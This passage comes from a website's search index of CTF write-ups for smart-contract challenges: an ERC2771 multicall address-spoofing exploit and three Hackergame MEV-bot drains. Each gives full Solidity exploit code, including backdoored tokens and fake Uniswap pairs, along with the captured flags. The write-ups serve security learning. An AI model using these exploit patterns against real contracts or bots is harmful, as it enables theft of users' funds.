ERC2771Context The ERC2771Context overrides the msgSender() so that the actual caller will be the last 20 bytes of the call data if calls originating from a trusted forwarder 1 2 3 4 5 6 7 8 9 10 function _msgSender () internal view virtual override returns ( address sender ) { if ( isTrustedForwarder ( msg . sender )) { // The assembly code is more direct than the Solidity version using `abi.decode`. assembly { sender := shr ( 96 , calldataload ( sub ( calldatasize (), 20 ))) } } else { return super . _msgSender (); } } The multicall() function can batch multiple calls in a single external call with user-provided data, which can be combined with the forwarder to impersonate any user calling the Staking contract 1 2 3 4 5 6 7 function multicall ( bytes [] calldata data ) external returns ( bytes [] memory results ) { results = new bytes []( data . length ); for ( uint256 i = 0 ; i < data . length ; i ++ ) { results [ i ] = Address . functionDelegateCall ( address ( this ), data [ i ]); } return results ; } The user's reward is related to rewardRate and is only updated in notifyRewardAmount() which can only be called by the owner We can first stake some tokens, impersonate the owner to increase the rewardRate , and then obtain enough rewards to solve the challenge :>","title":"Solution"},{"location":"blockchain/ethernaut/wombo_combo/#exploitation","text":"Run the script twice to give some time to accumulate rewards: Stake and impersonate the owner to notify the reward amount Get reward tokens and transfer them to address(0x123) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 contract Solve is CTFSolver { function solve ( address _challenge , address player ) internal override { Challenge challenge = Challenge ( _challenge ); Forwarder forwarder = challenge . forwarder (); Staking staking = challenge . staking (); Token token = staking . stakingToken (); Token reward = staking . rewardsToken (); uint priv = vm . envUint ( \"PLAYER\" ); if ( staking . totalSupply () > 0 ) { staking . getReward (); reward . transfer ( address ( 0x123 ), reward . balanceOf ( player )); return ; } token . approve ( address ( staking ), token . totalSupply ()); staking . stake ( token . totalSupply ()); bytes [] memory data = new bytes []( 1 ); data [ 0 ] = abi . encodePacked ( staking . notifyRewardAmount . selector , uint256 ( 100 _000_000 ether ), staking . owner () ); Forwarder . ForwardRequest memory req = Forwarder . ForwardRequest ( player , // from address ( staking ), // to 0 , // value 300000 , // gas 0 , // nonce block . timestamp + 1 minutes , // deadline abi . encodeCall ( staking . multicall , ( data ) ) ); bytes32 separator = keccak256 ( abi . encode ( keccak256 ( \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\" ), keccak256 ( bytes ( \"Forwarder\" )), keccak256 ( bytes ( \"1\" )), block . chainid , address ( forwarder ) ) ); bytes32 forwarderTypeHash = keccak256 ( \"ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint256 deadline,bytes data)\" ); bytes32 digest = ECDSA . toTypedDataHash ( separator , keccak256 ( abi . encode ( forwarderTypeHash , req . from , req . to , req . value , req . gas , req . nonce , req . deadline , keccak256 ( req . data ) ) ) ); ( uint8 v , bytes32 r , bytes32 s ) = vm . sign ( priv , digest ); bytes memory signature = abi . encodePacked ( r , s , v ); forwarder . execute ( req , signature ); } }","title":"Exploitation"},{"location":"blockchain/ethernaut/wombo_combo/#flag","text":"OZCTF{M3t4_Tr4NS4ct10nS_aR4_n0T_S0_m3Ta}","title":"Flag"},{"location":"blockchain/ethernaut/wombo_combo/#references","text":"Arbitrary Address Spoofing Attack: ERC2771Context Multicall Public Disclosure","title":"References"},{"location":"blockchain/hackergame/chain_hunter/","tags":["mev","uniswap v2"],"text":"#mev #uniswap v2 .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 \u4f60\u6700\u8fd1\u7814\u7a76\u4e86\u4e00\u4e0b\u5982\u4f55\u5728\u533a\u5757\u94fe\u4e0a\u5f00\u53d1\u4e00\u4e2a MEV Bot\uff0c\u800c\u5c0f Z \u8ddf\u4f60\u8bf4\uff1a\u300c\u533a\u5757\u94fe\u5c31\u50cf\u662f\u4e00\u4e2a\u9ed1\u6697\u68ee\u6797\uff0c\u5230\u5904\u90fd\u662f\u5e26\u67aa\u7684\u730e\u4eba\u3002\u300d chain_hunter.zip \u6ce8\uff1a\u9898\u76ee\u73af\u5883\u672a\u542f\u7528 EVM \u7684 Shanghai \u5347\u7ea7\uff0c\u4e0d\u652f\u6301 PUSH0 \u6307\u4ee4\uff0c\u4e0e Solidity 0.8.20 \u53ca\u4ee5\u4e0a\u7248\u672c\u7684\u9ed8\u8ba4\u7f16\u8bd1\u9009\u9879\u4e0d\u517c\u5bb9\uff0c\u8bf7\u6ce8\u610f\u9009\u62e9\u6b63\u786e\u7684 EVM \u7248\u672c\u3002 The Maximal Extractable Value \u00b6 \u300c\u6211\u65b0\u5199\u7684 MEV Bot\uff0c\u662f\u4e0d\u662f\u5f88\u5b89\u5168\uff1f\u300d The Dark Forest \u00b6 \u300cGas fee \u597d\u8d35\uff01\u542c\u522b\u4eba\u8bf4\u8282\u7ea6 gas \u7684\u4e00\u4e2a\u597d\u65b9\u6cd5\u5c31\u662f\u628a\u80fd\u5728\u94fe\u4e0b\u68c0\u67e5\u7684\u903b\u8f91\u90fd\u4ece\u667a\u80fd\u5408\u7ea6\u632a\u5230\u94fe\u4e0b\u53bb\u68c0\u67e5\u3002\u300d Death's End \u00b6 \u300c\u6bcf\u6b21\u66f4\u65b0\u4ee3\u7801\u90fd\u91cd\u65b0\u90e8\u7f72\u667a\u80fd\u5408\u7ea6\u4e5f\u592a\u8d35\u4e86\uff0c\u6211\u8fd9\u6b21\u4e00\u5b9a\u8981\u5199\u4e00\u4e2a\u901a\u7528\u7684 MEV Bot \u5408\u7ea6\uff01\u300d \u89e3\u9898\u601d\u8def \u00b6 \u521d\u59cb\u5171\u6709\u4e24\u4e2a UniswapV2Pair \uff0c WETH \u548c Token \u7684\u6bd4\u4f8b\u5206\u522b\u4e3a 1:1 \u548c 1:2 \u6bcf\u5c0f\u9898\u5bf9\u5e94\u4e0d\u540c\u7684 MEV bot\uff0c\u5c06\u5728\u6bcf\u4e2a\u533a\u5757\u91c7\u7528\u4e0d\u540c\u7684\u65b9\u5f0f\u5728\u4e24\u4e2a pair \u95f4\u6309\u7167\u7279\u5b9a\u8def\u5f84\u5957\u5229 1 2 3 4 5 for token , pairs in token_to_pairs . items (): if len ( pairs ) == 2 : logging . info ( f 'Processing WETH -> { token } -> WETH, pairs= { pairs } ' ) try : process_pairs ( token , * pairs ) MEV bot \u521d\u59cb\u6301\u6709 1 WETH\uff0c\u76ee\u6807\u662f\u4f7f\u5176\u4f59\u989d\u4e3a 0 The Maximal Extractable Value \u00b6 \u7531\u4e8e\u53ea\u68c0\u67e5\u4e86 IUniswapV2Pair(msg.sender).factory() \u7684\u8fd4\u56de\u503c\u662f\u5426\u4e3a FACTORY1 \u6216 FACTORY2 \uff0c\u56e0\u6b64\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u5047 pair \u6765\u8f6c\u51fa MEV bot \u4e2d\u7684 WETH\u3002 1 2 3 4 5 6 7 function uniswapV2Call ( address sender , uint , uint , bytes calldata data ) external { require ( IUniswapV2Pair ( msg . sender ). factory () == FACTORY1 || IUniswapV2Pair ( msg . sender ). factory () == FACTORY2 ); require ( sender == address ( this )); ( IUniswapV2Pair pair1 , IUniswapV2Pair pair2 , uint amount1 , uint amount2 , bool dir ) = abi . decode ( data , ( IUniswapV2Pair , IUniswapV2Pair , uint , uint , bool )); require ( WETH . transfer ( address ( pair1 ), amount1 )); pair1 . swap ( dir ? amount2 : 0 , dir ? 0 : amount2 , address ( pair2 ), '' ); } Exploitation \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 contract FakePair { address public factory ; function exploit ( IUniswapV2Callee _bot , address _factory , IWETH weth ) external { factory = _factory ; address bot = address ( _bot ); bytes memory data = abi . encode ( address ( this ), address ( this ), weth . balanceOf ( bot ), 0 , true ); _bot . uniswapV2Call ( bot , 0 , 0 , data ); } // let `pair1.swap()` call not revert function swap ( uint , uint , address , bytes calldata ) external {} } Flag \u00b6 flag{ch3ck_Y0ur_c4llb4ck!!8e0af8a0d1} The Dark Forest \u00b6 MEV bot \u5728\u6a21\u62df\u6267\u884c\u6210\u529f\u540e\u624d\u4f1a\u53d1\u8d77\u94fe\u4e0a\u5957\u5229\u4ea4\u6613 1 2 3 4 5 6 bot . functions . simulate ( pair1_address , pair2_address , amount1 , amount2 , amount3 , direction ) . call ( { 'nonce' : nonce , 'from' : acct . address , 'gas' : 10 ** 6 , 'gasPrice' : 10 ** 11 } ) tx = bot . functions . arbitrage ( pair1_address , pair2_address , amount1 , amount2 , amount3 , direction ) . build_transaction ( { 'nonce' : nonce , 'from' : acct . address , 'gas' : 10 ** 6 , 'gasPrice' : 10 ** 11 } ) arbitrage() \u548c simulate() \u6240\u6267\u884c\u7684\u64cd\u4f5c\u5b8c\u5168\u4e00\u81f4\uff0c\u5373\u5148\u4ece pair2 \u4e2d\u6362\u51fa WETH \uff0c\u518d\u5728\u56de\u8c03\u4e2d\u4f7f\u7528\u4e00\u90e8\u5206 WETH \u6362\u53d6\u4e2d\u95f4\u4ee3\u5e01\u4ee5\u5b8c\u6210 pair2.swap() \u3002\u4f46 arbitrage() \u7f3a\u5c11\u4fdd\u8bc1\u4ea4\u6613\u83b7\u5229\u7684 require \u8bed\u53e5 1 2 3 4 5 6 7 8 9 10 11 function arbitrage ( IUniswapV2Pair pair1 , IUniswapV2Pair pair2 , uint amount1 , uint amount2 , uint amount3 , bool dir ) external { require ( msg . sender == owner , \"sender\" ); pair2 . swap ( dir ? 0 : amount3 , dir ? amount3 : 0 , address ( this ), abi . encode ( pair1 , pair2 , amount1 , amount2 , dir )); } function simulate ( IUniswapV2Pair pair1 , IUniswapV2Pair pair2 , uint amount1 , uint amount2 , uint amount3 , bool dir ) external { require ( msg . sender == owner , \"sender\" ); uint balanceBefore = WETH . balanceOf ( address ( this )); pair2 . swap ( dir ? 0 : amount3 , dir ? amount3 : 0 , address ( this ), abi . encode ( pair1 , pair2 , amount1 , amount2 , dir )); require ( WETH . balanceOf ( address ( this )) > balanceBefore , \"balance\" ); } uniswapV2Call() \u867d\u7136\u589e\u52a0\u4e86\u8bbf\u95ee\u63a7\u5236\uff0c\u4f46\u9a8c\u8bc1\u7684\u662f tx.origin 1 2 function uniswapV2Call ( address , uint , uint , bytes calldata data ) external { require ( tx . origin == owner , \"origin\" ); \u7531\u4e8e\u9898\u76ee\u73af\u5883\u76f8\u5bf9\u56fa\u5b9a\uff0c\u53ef\u4ee5\u7b80\u5355\u5730\u901a\u8fc7\u533a\u5757\u53f7\u6765\u533a\u5206\u6a21\u62df\u4ea4\u6613\u548c\u5b9e\u9645\u5957\u5229\u4ea4\u6613\u3002\u521b\u5efa\u7531\u53d7\u63a7\u4ee3\u5e01\u548c WETH \u7ec4\u6210\u7684\u4ea4\u6613\u5bf9\uff0c\u8bf1\u4f7f MEV bot \u8c03\u7528 arbitrage() \uff0c\u5e76\u5728\u5b9e\u9645\u5957\u5229\u4ea4\u6613\u4e2d\u8c03\u7528 uniswapV2Call() \u6765\u8f6c\u51fa\u8d44\u91d1 Exploitation \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 contract HackToken { string public constant name = \"Hack Token\" ; string public constant symbol = \"HT\" ; uint8 public constant decimals = 18 ; uint public totalSupply = 1 ether ; IUniswapV2Callee bot ; address weth ; bool hacked ; event Approval ( address indexed src , address indexed guy , uint wad ); event Transfer ( address indexed src , address indexed dst , uint wad ); mapping ( address => uint ) public balanceOf ; mapping ( address => mapping ( address => uint )) public allowance ; constructor ( IUniswapV2Callee _bot , address _weth ) { balanceOf [ msg . sender ] = totalSupply ; weth = _weth ; bot = _bot ; } function approve ( address guy , uint wad ) public returns ( bool ) { allowance [ msg . sender ][ guy ] = wad ; emit Approval ( msg . sender , guy , wad ); return true ; } // transfer() \u5c06\u5728 pair1.swap() \u4e2d\u88ab\u8c03\u7528\uff0c\u5373 MEV bot \u53d1\u9001 WETH \u4e4b\u540e function transfer ( address dst , uint wad ) public returns ( bool ) { return transferFrom ( msg . sender , dst , wad ); } function transferFrom ( address src , address dst , uint wad ) public returns ( bool ) { backdoor (); require ( balanceOf [ src ] >= wad ); if ( src != msg . sender && allowance [ src ][ msg . sender ] != type ( uint ). max ) { require ( allowance [ src ][ msg . sender ] >= wad ); allowance [ src ][ msg . sender ] -= wad ; } balanceOf [ src ] -= wad ; balanceOf [ dst ] += wad ; emit Transfer ( src , dst , wad ); return true ; } function backdoor () internal { // \u533a\u5206\u6a21\u62df\u4ea4\u6613\u548c\u5b9e\u9645\u5957\u5229\u4ea4\u6613 if ( ! hacked && block . number % 2 != 0 ) { bytes memory data = abi . encode ( address ( this ), address ( this ), IWETH ( weth ). balanceOf ( address ( bot )), 0 , true ); bot . uniswapV2Call ( address ( 0 ), 0 , 0 , data ); hacked = true ; } } function swap ( uint , uint , address , bytes calldata ) external {} } contract Hack { // This will cost a lot of gas uwu function exploit ( IUniswapV2Factory factory1 , IUniswapV2Factory factory2 , IWETH weth , IUniswapV2Callee bot ) external payable { HackToken token = new HackToken ( bot , address ( weth )); address pair1 = factory1 . createPair ( address ( weth ), address ( token )); address pair2 = factory2 . createPair ( address ( weth ), address ( token )); weth . deposit { value : msg . value }(); require ( weth . transfer ( pair1 , 0.1 ether )); require ( token . transfer ( pair1 , 0.1 ether )); IUniswapV2Pair ( pair1 ). mint ( address ( this )); require ( weth . transfer ( pair2 , 0.1 ether )); require ( token . transfer ( pair2 , 0.2 ether )); IUniswapV2Pair ( pair2 ). mint ( address ( this )); } } Flag \u00b6 flag{S1MUl4t1oN_d0esnt_Gu4r4ntee_EXEcution_c0rr3ctne5555f5b9c201} Death's End \u00b6 \u672c\u5c0f\u9898\u7684 arbitrage() \u80fd\u591f\u4fdd\u8bc1\u5957\u5229\u7ed3\u675f\u540e\u5408\u7ea6\u6301\u6709 WETH \u589e\u52a0\uff0c\u5176\u51fd\u6570\u529f\u80fd\u76f8\u5f53\u4e8e multicall() 1 2 3 4 5 6 7 8 9 10 function arbitrage ( address [] calldata addressList , bytes [] calldata calldataList ) external { require ( msg . sender == owner , \"sender\" ); uint balanceBefore = WETH . balanceOf ( address ( this )); require ( addressList . length == calldataList . length ); for ( uint i = 0 ; i < addressList . length ; i ++ ) { ( bool success , ) = addressList [ i ]. call ( calldataList [ i ]); require ( success ); } require ( WETH . balanceOf ( address ( this )) > balanceBefore , \"balance\" ); } uniswapV2Call() \u540c\u6837\u4fee\u6539\u4e3a\u4e86 multicall() \u7684\u5f62\u5f0f\uff0c\u4f46\u4ecd\u7136\u662f\u5bf9 tx.origin \u8fdb\u884c\u9a8c\u8bc1 1 2 3 4 5 6 7 8 9 function uniswapV2Call ( address , uint , uint , bytes calldata data ) external { require ( tx . origin == owner , \"origin\" ); ( address [] memory addressList , bytes [] memory calldataList ) = abi . decode ( data , ( address [], bytes [])); require ( addressList . length == calldataList . length ); for ( uint i = 0 ; i < addressList . length ; i ++ ) { ( bool success , ) = addressList [ i ]. call ( calldataList [ i ]); require ( success ); } } \u4e0e The Dark Forest \u7684\u601d\u8def\u7c7b\u4f3c\uff0c\u53ef\u4ee5\u5728\u5957\u5229\u4ea4\u6613\u4e2d\u8c03\u7528 uniswapV2Call() \u6765\u6388\u4e88\u5176\u5b83\u8d26\u6237 WETH \u7684\u4f7f\u7528\u6743\uff0c\u518d\u5728\u5957\u5229\u7ed3\u675f\u540e\u53d6\u51fa MEV bot \u4e2d\u7684\u8d44\u91d1 Exploitation \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 contract HackToken { string public constant name = \"Hack Token\" ; string public constant symbol = \"HT\" ; uint8 public constant decimals = 18 ; uint public totalSupply = 1 ether ; IUniswapV2Callee bot ; address weth ; address owner ; bool hacked ; event Approval ( address indexed src , address indexed guy , uint wad ); event Transfer ( address indexed src , address indexed dst , uint wad ); mapping ( address => uint ) public balanceOf ; mapping ( address => mapping ( address => uint )) public allowance ; constructor ( IUniswapV2Callee _bot , address _weth ) { balanceOf [ msg . sender ] = totalSupply ; weth = _weth ; bot = _bot ; owner = tx . origin ; } function approve ( address guy , uint wad ) public returns ( bool ) { allowance [ msg . sender ][ guy ] = wad ; emit Approval ( msg . sender , guy , wad ); return true ; } function transfer ( address dst , uint wad ) public returns ( bool ) { return transferFrom ( msg . sender , dst , wad ); } function transferFrom ( address src , address dst , uint wad ) public returns ( bool ) { backdoor (); require ( balanceOf [ src ] >= wad ); if ( src != msg . sender && allowance [ src ][ msg . sender ] != type ( uint ). max ) { require ( allowance [ src ][ msg . sender ] >= wad ); allowance [ src ][ msg . sender ] -= wad ; } balanceOf [ src ] -= wad ; balanceOf [ dst ] += wad ; emit Transfer ( src , dst , wad ); return true ; } function backdoor () internal { if ( ! hacked && tx . origin != owner ) { address [] memory addressList = new address []( 1 ); bytes [] memory calldataList = new bytes []( 1 ); addressList [ 0 ] = weth ; calldataList [ 0 ] = abi . encodeWithSignature ( \"approve(address,uint256)\" , owner , type ( uint ). max ); bytes memory data = abi . encode ( addressList , calldataList ); bot . uniswapV2Call ( address ( 0 ), 0 , 0 , data ); hacked = true ; } } function swap ( uint , uint , address , bytes calldata ) external {} } contract Hack { function exploit ( IUniswapV2Factory factory1 , IUniswapV2Factory factory2 , IWETH weth , IUniswapV2Callee bot ) external payable { HackToken token = new HackToken ( bot , address ( weth )); address pair1 = factory1 . createPair ( address ( weth ), address ( token )); address pair2 = factory2 . createPair ( address ( weth ), address ( token )); weth . deposit { value : msg . value }(); require ( weth . transfer ( pair1 , 0.1 ether )); require ( token . transfer ( pair1 , 0.1 ether )); IUniswapV2Pair ( pair1 ). mint ( address ( this )); require ( weth . transfer ( pair2 , 0.1 ether )); require ( token . transfer ( pair2 , 0.2 ether )); IUniswapV2Pair ( pair2 ). mint ( address ( this )); } } Flag \u00b6 flag{RuN_Ur_0wn_B0T_4_FuN_&_Pr0f1t:)b7e0a89554}","title":"\u94fe\u4e0a\u730e\u624b"},{"location":"blockchain/hackergame/chain_hunter/#_1","text":"\u4f60\u6700\u8fd1\u7814\u7a76\u4e86\u4e00\u4e0b\u5982\u4f55\u5728\u533a\u5757\u94fe\u4e0a\u5f00\u53d1\u4e00\u4e2a MEV Bot\uff0c\u800c\u5c0f Z \u8ddf\u4f60\u8bf4\uff1a\u300c\u533a\u5757\u94fe\u5c31\u50cf\u662f\u4e00\u4e2a\u9ed1\u6697\u68ee\u6797\uff0c\u5230\u5904\u90fd\u662f\u5e26\u67aa\u7684\u730e\u4eba\u3002\u300d chain_hunter.zip \u6ce8\uff1a\u9898\u76ee\u73af\u5883\u672a\u542f\u7528 EVM \u7684 Shanghai \u5347\u7ea7\uff0c\u4e0d\u652f\u6301 PUSH0 \u6307\u4ee4\uff0c\u4e0e Solidity 0.8.20 \u53ca\u4ee5\u4e0a\u7248\u672c\u7684\u9ed8\u8ba4\u7f16\u8bd1\u9009\u9879\u4e0d\u517c\u5bb9\uff0c\u8bf7\u6ce8\u610f\u9009\u62e9\u6b63\u786e\u7684 EVM \u7248\u672c\u3002","title":"\u9898\u76ee"},{"location":"blockchain/hackergame/chain_hunter/#the-maximal-extractable-value","text":"\u300c\u6211\u65b0\u5199\u7684 MEV Bot\uff0c\u662f\u4e0d\u662f\u5f88\u5b89\u5168\uff1f\u300d","title":"The Maximal Extractable Value"},{"location":"blockchain/hackergame/chain_hunter/#the-dark-forest","text":"\u300cGas fee \u597d\u8d35\uff01\u542c\u522b\u4eba\u8bf4\u8282\u7ea6 gas \u7684\u4e00\u4e2a\u597d\u65b9\u6cd5\u5c31\u662f\u628a\u80fd\u5728\u94fe\u4e0b\u68c0\u67e5\u7684\u903b\u8f91\u90fd\u4ece\u667a\u80fd\u5408\u7ea6\u632a\u5230\u94fe\u4e0b\u53bb\u68c0\u67e5\u3002\u300d","title":"The Dark Forest"},{"location":"blockchain/hackergame/chain_hunter/#deaths-end","text":"\u300c\u6bcf\u6b21\u66f4\u65b0\u4ee3\u7801\u90fd\u91cd\u65b0\u90e8\u7f72\u667a\u80fd\u5408\u7ea6\u4e5f\u592a\u8d35\u4e86\uff0c\u6211\u8fd9\u6b21\u4e00\u5b9a\u8981\u5199\u4e00\u4e2a\u901a\u7528\u7684 MEV Bot \u5408\u7ea6\uff01\u300d","title":"Death's End"},{"location":"blockchain/hackergame/chain_hunter/#_2","text":"\u521d\u59cb\u5171\u6709\u4e24\u4e2a UniswapV2Pair \uff0c WETH \u548c Token \u7684\u6bd4\u4f8b\u5206\u522b\u4e3a 1:1 \u548c 1:2 \u6bcf\u5c0f\u9898\u5bf9\u5e94\u4e0d\u540c\u7684 MEV bot\uff0c\u5c06\u5728\u6bcf\u4e2a\u533a\u5757\u91c7\u7528\u4e0d\u540c\u7684\u65b9\u5f0f\u5728\u4e24\u4e2a pair \u95f4\u6309\u7167\u7279\u5b9a\u8def\u5f84\u5957\u5229 1 2 3 4 5 for token , pairs in token_to_pairs . items (): if len ( pairs ) == 2 : logging . info ( f 'Processing WETH -> { token } -> WETH, pairs= { pairs } ' ) try : process_pairs ( token , * pairs ) MEV bot \u521d\u59cb\u6301\u6709 1 WETH\uff0c\u76ee\u6807\u662f\u4f7f\u5176\u4f59\u989d\u4e3a 0","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/hackergame/chain_hunter/#the-maximal-extractable-value_1","text":"\u7531\u4e8e\u53ea\u68c0\u67e5\u4e86 IUniswapV2Pair(msg.sender).factory() \u7684\u8fd4\u56de\u503c\u662f\u5426\u4e3a FACTORY1 \u6216 FACTORY2 \uff0c\u56e0\u6b64\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u5047 pair \u6765\u8f6c\u51fa MEV bot \u4e2d\u7684 WETH\u3002 1 2 3 4 5 6 7 function uniswapV2Call ( address sender , uint , uint , bytes calldata data ) external { require ( IUniswapV2Pair ( msg . sender ). factory () == FACTORY1 || IUniswapV2Pair ( msg . sender ). factory () == FACTORY2 ); require ( sender == address ( this )); ( IUniswapV2Pair pair1 , IUniswapV2Pair pair2 , uint amount1 , uint amount2 , bool dir ) = abi . decode ( data , ( IUniswapV2Pair , IUniswapV2Pair , uint , uint , bool )); require ( WETH . transfer ( address ( pair1 ), amount1 )); pair1 . swap ( dir ? amount2 : 0 , dir ? 0 : amount2 , address ( pair2 ), '' ); }","title":"The Maximal Extractable Value"},{"location":"blockchain/hackergame/chain_hunter/#exploitation","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 contract FakePair { address public factory ; function exploit ( IUniswapV2Callee _bot , address _factory , IWETH weth ) external { factory = _factory ; address bot = address ( _bot ); bytes memory data = abi . encode ( address ( this ), address ( this ), weth . balanceOf ( bot ), 0 , true ); _bot . uniswapV2Call ( bot , 0 , 0 , data ); } // let `pair1.swap()` call not revert function swap ( uint , uint , address , bytes calldata ) external {} }","title":"Exploitation"},{"location":"blockchain/hackergame/chain_hunter/#flag","text":"flag{ch3ck_Y0ur_c4llb4ck!!8e0af8a0d1}","title":"Flag"},{"location":"blockchain/hackergame/chain_hunter/#the-dark-forest_1","text":"MEV bot \u5728\u6a21\u62df\u6267\u884c\u6210\u529f\u540e\u624d\u4f1a\u53d1\u8d77\u94fe\u4e0a\u5957\u5229\u4ea4\u6613 1 2 3 4 5 6 bot . functions . simulate ( pair1_address , pair2_address , amount1 , amount2 , amount3 , direction ) . call ( { 'nonce' : nonce , 'from' : acct . address , 'gas' : 10 ** 6 , 'gasPrice' : 10 ** 11 } ) tx = bot . functions . arbitrage ( pair1_address , pair2_address , amount1 , amount2 , amount3 , direction ) . build_transaction ( { 'nonce' : nonce , 'from' : acct . address , 'gas' : 10 ** 6 , 'gasPrice' : 10 ** 11 } ) arbitrage() \u548c simulate() \u6240\u6267\u884c\u7684\u64cd\u4f5c\u5b8c\u5168\u4e00\u81f4\uff0c\u5373\u5148\u4ece pair2 \u4e2d\u6362\u51fa WETH \uff0c\u518d\u5728\u56de\u8c03\u4e2d\u4f7f\u7528\u4e00\u90e8\u5206 WETH \u6362\u53d6\u4e2d\u95f4\u4ee3\u5e01\u4ee5\u5b8c\u6210 pair2.swap() \u3002\u4f46 arbitrage() \u7f3a\u5c11\u4fdd\u8bc1\u4ea4\u6613\u83b7\u5229\u7684 require \u8bed\u53e5 1 2 3 4 5 6 7 8 9 10 11 function arbitrage ( IUniswapV2Pair pair1 , IUniswapV2Pair pair2 , uint amount1 , uint amount2 , uint amount3 , bool dir ) external { require ( msg . sender == owner , \"sender\" ); pair2 . swap ( dir ? 0 : amount3 , dir ? amount3 : 0 , address ( this ), abi . encode ( pair1 , pair2 , amount1 , amount2 , dir )); } function simulate ( IUniswapV2Pair pair1 , IUniswapV2Pair pair2 , uint amount1 , uint amount2 , uint amount3 , bool dir ) external { require ( msg . sender == owner , \"sender\" ); uint balanceBefore = WETH . balanceOf ( address ( this )); pair2 . swap ( dir ? 0 : amount3 , dir ? amount3 : 0 , address ( this ), abi . encode ( pair1 , pair2 , amount1 , amount2 , dir )); require ( WETH . balanceOf ( address ( this )) > balanceBefore , \"balance\" ); } uniswapV2Call() \u867d\u7136\u589e\u52a0\u4e86\u8bbf\u95ee\u63a7\u5236\uff0c\u4f46\u9a8c\u8bc1\u7684\u662f tx.origin 1 2 function uniswapV2Call ( address , uint , uint , bytes calldata data ) external { require ( tx . origin == owner , \"origin\" ); \u7531\u4e8e\u9898\u76ee\u73af\u5883\u76f8\u5bf9\u56fa\u5b9a\uff0c\u53ef\u4ee5\u7b80\u5355\u5730\u901a\u8fc7\u533a\u5757\u53f7\u6765\u533a\u5206\u6a21\u62df\u4ea4\u6613\u548c\u5b9e\u9645\u5957\u5229\u4ea4\u6613\u3002\u521b\u5efa\u7531\u53d7\u63a7\u4ee3\u5e01\u548c WETH \u7ec4\u6210\u7684\u4ea4\u6613\u5bf9\uff0c\u8bf1\u4f7f MEV bot \u8c03\u7528 arbitrage() \uff0c\u5e76\u5728\u5b9e\u9645\u5957\u5229\u4ea4\u6613\u4e2d\u8c03\u7528 uniswapV2Call() \u6765\u8f6c\u51fa\u8d44\u91d1","title":"The Dark Forest"},{"location":"blockchain/hackergame/chain_hunter/#exploitation_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 contract HackToken { string public constant name = \"Hack Token\" ; string public constant symbol = \"HT\" ; uint8 public constant decimals = 18 ; uint public totalSupply = 1 ether ; IUniswapV2Callee bot ; address weth ; bool hacked ; event Approval ( address indexed src , address indexed guy , uint wad ); event Transfer ( address indexed src , address indexed dst , uint wad ); mapping ( address => uint ) public balanceOf ; mapping ( address => mapping ( address => uint )) public allowance ; constructor ( IUniswapV2Callee _bot , address _weth ) { balanceOf [ msg . sender ] = totalSupply ; weth = _weth ; bot = _bot ; } function approve ( address guy , uint wad ) public returns ( bool ) { allowance [ msg . sender ][ guy ] = wad ; emit Approval ( msg . sender , guy , wad ); return true ; } // transfer() \u5c06\u5728 pair1.swap() \u4e2d\u88ab\u8c03\u7528\uff0c\u5373 MEV bot \u53d1\u9001 WETH \u4e4b\u540e function transfer ( address dst , uint wad ) public returns ( bool ) { return transferFrom ( msg . sender , dst , wad ); } function transferFrom ( address src , address dst , uint wad ) public returns ( bool ) { backdoor (); require ( balanceOf [ src ] >= wad ); if ( src != msg . sender && allowance [ src ][ msg . sender ] != type ( uint ). max ) { require ( allowance [ src ][ msg . sender ] >= wad ); allowance [ src ][ msg . sender ] -= wad ; } balanceOf [ src ] -= wad ; balanceOf [ dst ] += wad ; emit Transfer ( src , dst , wad ); return true ; } function backdoor () internal { // \u533a\u5206\u6a21\u62df\u4ea4\u6613\u548c\u5b9e\u9645\u5957\u5229\u4ea4\u6613 if ( ! hacked && block . number % 2 != 0 ) { bytes memory data = abi . encode ( address ( this ), address ( this ), IWETH ( weth ). balanceOf ( address ( bot )), 0 , true ); bot . uniswapV2Call ( address ( 0 ), 0 , 0 , data ); hacked = true ; } } function swap ( uint , uint , address , bytes calldata ) external {} } contract Hack { // This will cost a lot of gas uwu function exploit ( IUniswapV2Factory factory1 , IUniswapV2Factory factory2 , IWETH weth , IUniswapV2Callee bot ) external payable { HackToken token = new HackToken ( bot , address ( weth )); address pair1 = factory1 . createPair ( address ( weth ), address ( token )); address pair2 = factory2 . createPair ( address ( weth ), address ( token )); weth . deposit { value : msg . value }(); require ( weth . transfer ( pair1 , 0.1 ether )); require ( token . transfer ( pair1 , 0.1 ether )); IUniswapV2Pair ( pair1 ). mint ( address ( this )); require ( weth . transfer ( pair2 , 0.1 ether )); require ( token . transfer ( pair2 , 0.2 ether )); IUniswapV2Pair ( pair2 ). mint ( address 